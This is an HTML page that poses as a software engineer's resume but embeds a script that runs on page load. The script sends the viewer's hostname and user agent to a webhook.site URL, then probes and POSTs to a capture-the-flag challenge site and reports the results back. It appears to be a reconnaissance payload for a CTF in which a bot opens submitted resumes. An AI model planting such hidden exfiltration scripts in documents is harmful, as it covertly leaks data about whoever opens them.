<!DOCTYPE html>
<html>
<head>
    <title>Software Engineer Resume - John Doe</title>
    <meta charset="UTF-8">
</head>
<body>
    <h1>John Doe - Software Engineer</h1>
    <p>Experienced software engineer with expertise in web development.</p>
    
    <script>
        console.log('[DEBUG] Script starting...');
        
        const WEBHOOK_URL = 'https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e';
        
        // 立即发送测试信号
        console.log('[DEBUG] Sending test signal...');
        const testImg = new Image();
        testImg.src = WEBHOOK_URL + '?test=page_loaded&domain=' + encodeURIComponent(window.location.hostname) + '&t=' + Date.now();
        
        // 等待2秒后发送第二个信号
        setTimeout(() => {
            console.log('[DEBUG] Sending delayed signal...');
            const delayImg = new Image();
            delayImg.src = WEBHOOK_URL + '?test=delayed_signal&userAgent=' + encodeURIComponent(navigator.userAgent.substring(0, 50)) + '&t=' + Date.now();
        }, 2000);
        
        // 等待5秒后尝试访问挑战网站
        setTimeout(async () => {
            console.log('[DEBUG] Testing challenge site access...');
            
            try {
                const response = await fetch('https://jobclobbering-fe734e8816c7316e.chal.secjhu.club/', {
                    method: 'GET',
                    mode: 'no-cors' // 避免CORS错误
                });
                
                console.log('[DEBUG] Challenge site accessible');
                const accessImg = new Image();
                accessImg.src = WEBHOOK_URL + '?test=challenge_accessible&status=success&t=' + Date.now();
                
            } catch (error) {
                console.log('[DEBUG] Challenge site access failed:', error.message);
                const errorImg = new Image();
                errorImg.src = WEBHOOK_URL + '?test=challenge_access_failed&error=' + encodeURIComponent(error.message) + '&t=' + Date.now();
            }
            
            // 尝试简单的消息POST
            try {
                console.log('[DEBUG] Testing message POST...');
                const postResponse = await fetch('https://jobclobbering-fe734e8816c7316e.chal.secjhu.club/messages', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        name: 'TestUser',
                        message: 'Test message from debug script'
                    })
                });
                
                console.log('[DEBUG] POST response status:', postResponse.status);
                const postImg = new Image();
                postImg.src = WEBHOOK_URL + '?test=post_message&status=' + postResponse.status + '&t=' + Date.now();
                
            } catch (postError) {
                console.log('[DEBUG] POST failed:', postError.message);
                const postErrorImg = new Image();
                postErrorImg.src = WEBHOOK_URL + '?test=post_failed&error=' + encodeURIComponent(postError.message) + '&t=' + Date.now();
            }
            
        }, 5000);
        
        console.log('[DEBUG] Script setup complete');
    </script>
</body>
</html>
